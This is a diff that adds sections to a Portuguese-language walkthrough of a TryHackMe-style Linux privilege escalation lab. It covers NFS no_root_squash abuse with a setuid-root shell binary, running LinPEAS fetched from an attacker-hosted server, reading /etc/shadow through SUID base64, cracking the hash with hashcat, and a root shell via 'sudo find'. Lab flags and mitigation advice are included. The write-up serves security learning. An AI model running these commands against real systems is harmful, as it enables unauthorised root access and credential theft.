@@ -172,7 +172,6 @@ O LinPEAS (Linux Privilege Escalation Awesome Script) é uma ferramenta de enume
 
 **Na máquina atacante:**
 
-
 ```bash
 # Download do exploit da Exploit Database
 wget "https://www.exploit-db.com/download/37292"
@@ -434,7 +433,7 @@ Resposta:
 frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
 ```
 
-### Análise do Hash
+**Análise do Hash:**
 
 - `$6`: Indica algoritmo SHA-512
 - `2.sUUDsOLIpXKxcr`: Salt (12 caracteres)
@@ -1275,3 +1274,546 @@ PATH Hijacking é uma técnica poderosa que explora a confiança cega no PATH e 
 **Lembre-se:** Esta técnica funciona porque o sistema confia na ordem do PATH. Como atacante, você está apenas "ajudando" o sistema a encontrar um executável "mais conveniente" primeiro!
 
 ---
+## 9. NFS (Network File System)
+
+### 9.1. Visão Geral
+
+O NFS (Network File System) é um protocolo que permite compartilhar diretórios entre sistemas em uma rede. Quando mal configurado, pode se tornar um vetor crítico para escalação de privilégios.
+
+O arquivo de configuração do NFS fica em `/etc/exports` e define quais diretórios são compartilhados e com quais opções.
+
+### 9.2. Identificando a Vulnerabilidade
+
+A opção crítica para escalação de privilégios é **`no_root_squash`**.
+
+|Opção|Comportamento Normal|Com `no_root_squash`|
+|---|---|---|
+|`root_squash` (padrão)|Root do cliente é mapeado para usuário `nfsnobody` (sem privilégios)|-|
+|`no_root_squash`|-|**Root do cliente mantém privilégios root** no compartilhamento|
+
+Se um compartilhamento estiver configurado com `no_root_squash` e for **gravável**, podemos:
+
+1. Criar um binário com SUID em nossa máquina atacante
+2. Executá-lo na máquina alvo para obter root 
+
+### 9.3. Verificando a Configuração
+
+```bash
+# No alvo - verificar compartilhamentos com no_root_squash
+cat /etc/exports
+```
+
+**Exemplo de saída vulnerável:**
+
+```text
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+### 9.4. Enumerando Compartilhamentos
+
+Da máquina atacante, listamos os compartilhamentos disponíveis:
+
+```bash
+showmount -e [IP_ALVO]
+```
+
+**Saída:**
+
+```text
+Export list for [IP_ALVO]:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+### 9.5. Montando o Compartilhamento
+
+Criamos um diretório local e montamos o compartilhamento remoto:
+
+```bash
+# Criar diretório para montagem
+mkdir /tmp/nfs_mount
+
+# Montar o compartilhamento (requer sudo)
+sudo mount -o rw [IP_ALVO]:/tmp /tmp/nfs_mount
+
+# Verificar montagem
+mount | grep nfs
+df -h | grep nfs
+```
+
+**Explicação do comando:**
+
+- `sudo`: Necessário porque montar sistemas de arquivos é operação privilegiada
+- `mount`: Comando para montar sistemas de arquivos
+- `-o rw`: Monta com permissões de leitura e escrita
+- `[IP_AVLO]:/tmp`: Host remoto e diretório compartilhado
+- `/tmp/nfs_mount`: Ponto de montagem local
+
+> **Nota:** O `sudo` é necessário porque a montagem de sistemas de arquivos NFS requer privilégios de root na máquina atacante.
+
+### 9.6. Criando o Binário Malicioso
+
+Dentro do diretório montado (agora acessível tanto local quanto remotamente), criamos nosso exploit:
+
+**Código (`nfs_exploit.c`):**
+
+```c
+#include <unistd.h>
+#include <stdlib.h>
+
+int main()
+{
+    // Define os IDs de usuário e grupo para root (0)
+    setuid(0);
+    setgid(0);
+    
+    // Executa uma shell
+    system("/bin/bash");
+    
+    return 0;
+}
+```
+
+**Compilação e configuração:**
+
+```bash
+# Compilar estaticamente para evitar problemas de dependências
+gcc -static nfs_exploit.c -o nfs_shell
+
+# Adicionar SUID bit (agora como root na máquina atacante)
+sudo chmod +s nfs_shell
+
+# Verificar permissões
+ls -l nfs_shell
+```
+
+**Saída esperada:**
+
+```text
+-rwsr-sr-x 1 root root 835968 Mar 3 15:16 nfs_shell
+```
+
+Os bits `s` no lugar de `x` indicam SUID e SGID ativos.
+
+### 9.7. Executando no Alvo
+
+No terminal da máquina alvo (via shell já obtido), navegamos até o diretório compartilhado:
+
+```bash
+# No alvo
+cd /tmp
+ls -l
+```
+
+**Saída:**
+
+```text
+-rwsr-sr-x  1 root root 835968 Mar  3 15:16 nfs_shell
+-rw-r--r--  1 root root    112 Mar  3 15:13 nfs_exploit.c
+```
+
+**Saída:**
+
+```bash
+./nfs_shell
+whoami
+```
+
+**Resultado:**
+
+```text
+root
+```
+
+### 9.8. Desmontando o Compartilhamento (Boas Práticas)
+
+Após obter acesso root, é boa prática desmontar o compartilhamento na máquina atacante:
+
+```bash
+# Sair do diretório montado
+cd ~
+
+# Desmontar
+sudo umount /tmp/nfs_mount
+
+# Verificar se desmontou
+mount | grep nfs  # Não deve retornar nada
+```
+
+### 9.9. Coleta da Flag
+
+```bash
+# Buscar flags
+find / -name "flag*" 2>/dev/null
+
+# Resultado típico
+/home/matt/flag7.txt
+
+# Ler a flag
+cat /home/matt/flag7.txt
+```
+
+**Flag:**
+
+```text
+THM-89384012
+```
+
+### 9.10. Resumo do Vetor
+
+|Passo|Ação|Local|
+|---|---|---|
+|1|Identificar `no_root_squash` em `/etc/exports`|Alvo|
+|2|Listar compartilhamentos com `showmount`|Atacante|
+|3|Montar compartilhamento com `sudo mount`|Atacante|
+|4|Criar binário SUID no diretório montado|Atacante|
+|5|Executar binário no alvo|Alvo|
+|6|Obter shell root|Alvo|
+|7|Desmontar compartilhamento|Atacante|
+
+### 9.11. Mitigação
+
+Para prevenir este vetor:
+
+1. **Evite `no_root_squash`** em compartilhamentos graváveis
+2. Use `root_squash` (padrão) para mapear root para `nfsnobody` 
+3. Restrinja acesso por IP sempre que possível
+4. Use firewalls para limitar quem pode montar os compartilhamentos
+5. Monitore atividades suspeitas em diretórios compartilhados
+
+---
+## 10. Na Prática: Escalação de Privilégios em Cenário Real
+
+Este cenário prático demonstra uma cadeia completa de escalação de privilégios em Linux, desde a enumeração inicial com **LinPEAS** até a obtenção de acesso root.
+
+### 10.1. Enumeração Automatizada com LinPEAS
+
+**LinPEAS** (Linux Privilege Escalation Awesome Script) é um script que automatiza a busca por vetores de escalação de privilégios.
+
+**Na máquina atacante (servindo o script):**
+
+```bash
+# Iniciar servidor HTTP para transferir o script
+sudo python3 -m http.server 80
+```
+
+**Na máquina alvo (baixando e executando):**
+
+```bash
+# Baixar o script
+wget "http://[IP_ATACANTE]/linpeas.sh"
+
+# Dar permissão de execução
+chmod +x linpeas.sh
+
+# Executar
+./linpeas.sh
+```
+
+### 10.2. Descoberta Crucial: SUID em /usr/bin/base64
+
+Entre os resultados do LinPEAS, um item se destacou:
+
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+-rwsr-xr-x. 1 root root 37K Ago 20  2019 /usr/bin/base64  
+```
+
+#### O que significa SUID?
+
+|Permissão|Significado|
+|---|---|
+|`rwsr-xr-x`|O 's' no lugar do 'x' para o dono indica **SUID ativo**|
+|`root root`|O binário pertence ao root|
+|`/usr/bin/base64`|Binário que pode ser executado com privilégios de root|
+
+**SUID (Set User ID):** Quando um binário com SUID é executado, ele roda com as permissões do **dono do arquivo** (root), não do usuário que o executou.)
+
+### 10.3. Explorando base64 com SUID
+
+Consultando o **[GTFOBins](https://gtfobins.org/base64/)** (repositório de binários exploráveis), descobrimos que base64 pode ser usado para ler arquivos:
+
+```bash
+# Ler o arquivo de senhas (shadow)
+base64 /etc/shadow | base64 --decode
+```
+
+**Explicação do comando:**
+
+1. `base64 /etc/shadow`: Codifica o conteúdo do shadow em base64 (requer leitura do arquivo)
+2. `|`: Pipe (redireciona saída)
+3. `base64 --decode`: Decodifica de volta ao formato original
+
+**Por que funciona?**
+
+- O binário `base64` tem SUID root → pode ler qualquer arquivo
+- A codificação em base64 é apenas para transporte seguro
+- O resultado final é o conteúdo original do arquivo
+
+**Resultado obtido:**
+
+```text
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
+```
+
+### 10.4. Quebra do Hash com Hashcat
+
+#### Identificando o tipo de hash:
+
+```bash
+hashid -m '$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
+'
+```
+
+**Resultado:**
+
+```text
+[+] SHA-512 Crypt [Hashcat Mode: 1800]
+```
+
+#### Preparando para quebra:
+
+```bash
+# Salvar hash em arquivo
+echo '$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/' > hash.txt
+
+# Executar Hashcat
+hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Explicação do Hashcat:**
+
+|Parâmetro|Descrição|
+|---|---|
+|`-m 1800`|Modo SHA-512 Crypt (Unix)|
+|`-a 0`|Ataque de dicionário (straight)|
+|`hash.txt`|Arquivo com o hash alvo|
+|`/usr/share/wordlists/rockyou.txt`|Wordlist para o ataque|
+
+**Resultado:**
+
+```text
+$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
+```
+
+**Senha encontrada:** `Password1`
+
+### 10.5. Acesso como Usuário missy
+
+```bash
+# Trocar para usuário missy
+su missy
+# Senha: Password1
+
+# Verificar usuário atual
+whoami
+```
+
+**Resultado:**
+
+```text
+missy
+```
+
+### 10.6. Coleta da Primeira Flag
+
+```bash
+# Buscar arquivos com nome 'flag1.txt'
+find / -name "flag1.txt" 2>/dev/null
+```
+
+**Resultado:**
+
+```text
+/home/missy/Documents/flag1.txt
+```
+
+```bash
+# Ler a flag
+cat /home/missy/Documents/flag1.txt
+```
+
+**Flag 1:**
+
+```text
+THM-42828719920544
+```
+
+### 10.7. Escalação para Root
+
+#### Verificando permissões sudo do usuário missy:
+
+```bash
+sudo -l
+```
+
+**Resultado:**
+
+```text
+Usuário missy pode executar os seguintes comandos em [IP_AVLO]:
+    (ALL) NOPASSWD: /usr/bin/find
+```
+
+#### O que esta linha significa?
+
+|Componente|Significado|
+|---|---|
+|`(ALL)`|Pode executar como qualquer usuário (inclusive root)|
+|`NOPASSWD:`|Não solicita senha|
+|`/usr/bin/find`|Único binário permitido|
+
+**Implicação:** Podemos executar `find` com privilégios de root sem fornecer senha.
+
+### 10.8. Explorando find com GTFOBins
+
+Consultando **[GTFOBins para find](https://gtfobins.org/find/)**:
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+**Explicação do comando:**
+
+|Parte|Descrição|
+|---|---|
+|`sudo`|Executa como root|
+|`find .`|Busca no diretório atual|
+|`-exec /bin/sh \;`|Para cada arquivo encontrado, executa `/bin/sh`|
+|`-quit`|Sai após a primeira execução (evita múltiplas shells)|
+
+**Resultado:**
+
+```bash
+sh-4.2# whoami
+root
+```
+
+### 10.9. Coleta da Flag Root
+
+```bash
+# Buscar segunda flag
+find / -name "flag2.txt" 2>/dev/null
+```
+
+**Resultado:**
+
+```text
+/home/rootflag/flag2.txt
+```
+
+```bash
+# Ler a flag
+cat /home/rootflag/flag2.txt
+```
+
+**Flag 2:**
+
+```text
+THM-168824782390238
+```
+
+### 10.10. Resumo da Cadeia de Ataque
+
+|Passo|Ação|Resultado|
+|---|---|---|
+|1|LinPEAS identificou `/usr/bin/base64` com SUID|Vetor de leitura de arquivos|
+|2|Exploramos base64 para ler `/etc/shadow`|Obtivemos hash do usuário missy|
+|3|Hashcat quebrou o hash|Senha `Password1` descoberta|
+|4|Acesso como missy|Primeira flag coletada|
+|5|`sudo -l` revelou permissão para `find`|Vetor de escalação identificado|
+|6|GTFOBins forneceu comando para exploit|Shell root obtido|
+|7|Busca e leitura da flag root|Segunda flag coletada|
+
+### 10.11. Lições Aprendidas
+
+| Vulnerabilidade                      | Correção                                                         |
+| ------------------------------------ | ---------------------------------------------------------------- |
+| SUID em binários desnecessários      | Remover SUID de binários como base64: `chmod -s /usr/bin/base64` |
+| Senha fraca (Password1)              | Política de senhas fortes                                        |
+| Sudo excessivo (`find` com NOPASSWD) | Restringir comandos sudo ao mínimo necessário                    |
+
+---
+## 11. Conclusão
+
+### 11.1. Síntese dos Resultados
+
+Ao longo deste laboratório, foram explorados com sucesso **sete vetores distintos** de escalação de privilégios em um sistema Linux Ubuntu 14.04. A tabela abaixo resume os principais resultados obtidos:
+
+| Seção  | Vetor Explorado           | Método                      |
+| ------ | ------------------------- | --------------------------- |
+| **3**  | OverlayFS (CVE-2015-1328) | Exploit de kernel           |
+| **4**  | Sudo mal configurado      | GTFOBins (find)             |
+| **5**  | SUID em base64            | Leitura de arquivos + John  |
+| **6**  | Capabilities (cap_setuid) | Exploração de capabilities  |
+| **7**  | Cron Jobs                 | Reverse shell via backup.sh |
+| **8**  | PATH Hijacking            | Manipulação de PATH         |
+| **9**  | NFS (no_root_squash)      | Criação de binário SUID     |
+| **10** | Cenário Prático           | SUID + Sudo combinados      |
+
+### 11.2. Análise Crítica
+
+#### 11.2.1. A Importância da Enumeração
+
+A enumeração sistemática provou ser o fator mais crítico para o sucesso da escalação. Em todos os casos, a descoberta do vetor vulnerável dependeu de uma verificação cuidadosa do sistema:
+
+- **SUID:** `find / -perm -4000 2>/dev/null`
+- **Sudo:** `sudo -l`
+- **Capabilities:** `getcap -r / 2>/dev/null`
+- **Cron:** `cat /etc/crontab`
+- **NFS:** `cat /etc/exports`
+
+Sem estas verificações iniciais, os vetores permaneceriam ocultos.
+
+#### 11.2.2. A Relevância do GTFOBins
+
+O repositório **GTFOBins** demonstrou ser uma ferramenta indispensável para o pentester. Em múltiplas ocasiões (find, base64), a consulta a este recurso forneceu os comandos exatos necessários para explorar binários com permissões especiais.
+
+#### 11.2.3. Vulnerabilidades de Kernel vs. Configuração
+
+Das explorações realizadas:
+
+- **2** envolveram vulnerabilidades de kernel (OverlayFS)
+- **5** envolveram más configurações do sistema (sudo, SUID, capabilities, cron, NFS)
+
+Este dado reforça a importância de **auditorias de configuração** regulares, não apenas da atualização do kernel.
+
+---
+## 12. Referências
+
+### 12.1. Documentação Oficial e Bases de Vulnerabilidades
+
+|Recurso|Descrição|Link|
+|---|---|---|
+|**CVE-2015-1328**|OverlayFS Vulnerability|[cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)|
+|**CVE-2016-5195**|Dirty COW|[dirtycow.ninja](https://dirtycow.ninja/)|
+|**CVE-2021-4034**|PwnKit|[qualys.com](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)|
+|**Ubuntu Security Notices**|Boletins de segurança Ubuntu|[ubuntu.com/security](https://ubuntu.com/security)|
+
+### 12.2. Ferramentas e Repositórios
+
+|Ferramenta|Descrição|Link|
+|---|---|---|
+|**LinPEAS**|Script de enumeração|[github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)|
+|**GTFOBins**|Binários Unix exploráveis|[gtfobins.github.io](https://gtfobins.github.io/)|
+|**Exploit Database**|Base de exploits|[exploit-db.com](https://www.exploit-db.com)|
+|**Hashcat**|Ferramenta de quebra de hashes|[hashcat.net](https://hashcat.net)|
+|**John the Ripper**|Quebra de senhas|[openwall.com/john](https://www.openwall.com/john/)|
+
+### 12.3. Artigos e Documentação Técnica
+
+|Título|Autor/Fonte|Link|
+|---|---|---|
+|**Linux Privilege Escalation**|TryHackMe|[tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)|
+|**Basic Linux Privilege Escalation**|g0tmi1k|[blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)|
+|**Linux Privilege Escalation Cheatsheet**|HackTricks|[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)|
+|**OverlayFS Vulnerability Analysis**|Seclists|[seclists.org/oss-sec](http://seclists.org/oss-sec/2015/q2/717)|
+
+### 12.4. Wordlists e Recursos Adicionais
+
+| Recurso         | Descrição                       | Localização Típica                 |
+| --------------- | ------------------------------- | ---------------------------------- |
+| **rockyou.txt** | Wordlist para quebra de senhas  | `/usr/share/wordlists/rockyou.txt` |
+| **SecLists**    | Coleção abrangente de wordlists | `/usr/share/seclists`              |
